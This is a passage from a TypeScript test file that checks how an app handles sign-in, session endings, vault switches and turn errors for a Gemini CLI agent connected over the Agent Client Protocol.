    expect(h.state().session!).toMatchObject({ phase: "auth", authProblem: "declined", manualSignIn: null });

    h.native.login = "no-terminal";
    await h.agents.signIn("login");
    expect(h.state().session!).toMatchObject({ phase: "auth", authProblem: "no-terminal", manualSignIn: "/usr/bin/gemini --acp login" });

    h.native.login = "cancelled";
    await h.agents.signIn("login");
    expect(h.state().session!).toMatchObject({ phase: "auth", authProblem: "cancelled", manualSignIn: null });
    h.agents.cancelSignIn();
    expect(h.native.cancelled).toBe(1);

    // The user signed in somewhere else: trying again starts the agent anew.
    h.native.signedIn = true;
    await h.agents.retry();
    expect(h.state().session!.phase).toBe("ready");
    expect(h.native.processes).toHaveLength(2);
  });

  it("is done by the agent itself where it names such a way", async () => {
    const h = await acpHarness(() => ({ needsAuth: true, authMethods: [{ id: "browser", name: "Sign in with your account" }] }));
    await h.agents.start("geminicli");
    await h.agents.signIn("browser");
    expect(h.agent().received.map((message) => message.method)).toEqual(["initialize", "session/new", "authenticate", "session/new"]);
    expect(h.state().session!.phase).toBe("ready");
    expect(h.native.logins).toEqual([]);
    expect(h.native.processes).toHaveLength(1);
  });

  it("has nowhere to happen from here where the agent names no way", async () => {
    const h = await acpHarness(() => ({ needsAuth: true }));
    await h.agents.start("geminicli");
    expect(h.state().session!).toMatchObject({ phase: "auth", authProblem: "no-method", authMethods: [] });
  });
});

describe("a session ends", () => {
  it("with the program, and says how", async () => {
    const h = await acpHarness(turns([{ say: "Working" }, { exit: 137 }]));
    h.native.lastWords = "fatal: out of memory\n";
    await h.agents.start("geminicli");
    await h.agents.send("Go");
    await h.settle();
    const current = h.state().session!;
    expect(current.phase).toBe("ended");
    expect(current.problem).toEqual({ kind: "exited", code: 137 });
    expect(await h.agents.log()).toBe("fatal: out of memory\n");
    expect(h.state().sessions[0]).toMatchObject({ end: "exited", turns: 1 });
    // Nothing more is sent to a session that ended.
    const before = h.agent().received.length;
    await h.agents.send("Hello?");
    expect(h.agent().received.length).toBe(before);
  });

  it("before it began, where the program cannot be started or speaks another revision — and leaves no line in the log", async () => {
    const moved = await acpHarness(() => ({ startFails: "program-moved" }));
    await moved.agents.start("geminicli");
    expect(moved.state().session!).toMatchObject({ phase: "ended", problem: { kind: "start", word: "program-moved" } });
    expect(moved.state().sessions).toEqual([]);

    const other = await acpHarness(() => ({ version: 2 }));
    await other.agents.start("geminicli");
    expect(other.state().session!).toMatchObject({ phase: "ended", problem: { kind: "version" } });
    expect(other.agent().stopped).toBe(true);
  });

  it("with its vault: a session belongs to the vault it was started in, and its log line goes there", async () => {
    const h = await acpHarness(turns([{ say: "Hi" }]));
    await h.agents.start("geminicli");
    await h.agents.send("Hello");
    const first = h.vault;
    const second = memoryAcpVault({ "Other.md": "# Other\n" }, []);
    h.agents.attach(second.side);
    await h.settle();
    expect(h.agent().stopped).toBe(true);
    expect(h.state().session).toBeNull();
    expect(await first.side.store.sessions()).toHaveLength(1);
    expect(await second.side.store.sessions()).toEqual([]);
  });

  it("when its agent is removed", async () => {
    const h = await acpHarness();
    await h.agents.start("geminicli");
    await h.agents.remove("geminicli");
    expect(h.agent().stopped).toBe(true);
    expect(h.state().session).toBeNull();
    expect(h.state().agents).toEqual([]);
    // Installed and not added any more: offered again.
    expect(h.state().found.map((entry) => entry.key)).toContain("gemini");
  });

  it("says why a turn stopped where it was not done, and what the agent said where it failed", async () => {
    const h = await acpHarness(() => ({ turns: [[{ say: "Part" }]] }));
    await h.agents.start("geminicli");
    // The agent ends the next turn with a reason of its own.
    const agent = h.agent();
    const write = agent.port.write.bind(agent.port);
    agent.port.write = async (line) => {
      const message = JSON.parse(line) as { id?: number; method?: string };
      if (message.method === "session/prompt" && agent.received.filter((entry) => entry.method === "session/prompt").length === 1) {
        agent.received.push(message as Record<string, unknown>);
        agent.emit({ jsonrpc: "2.0", id: message.id, result: { stopReason: "max_tokens" } });
        return;
      }
      if (message.method === "session/prompt" && agent.received.filter((entry) => entry.method === "session/prompt").length === 2) {
        agent.received.push(message as Record<string, unknown>);
        agent.emit({ jsonrpc: "2.0", id: message.id, error: { code: -32603, message: "The model is overloaded" } });
        return;
      }
      await write(line);
    };
    await h.agents.send("One");
    await h.agents.send("Two");
    await h.agents.send("Three");
    expect(events(h.state().session!.thread)).toEqual([
      { type: "stopped", reason: "max_tokens" },
      { type: "failed", message: "The model is overloaded" },
    ]);
    expect(h.state().session!.phase).toBe("ready");
  });
});
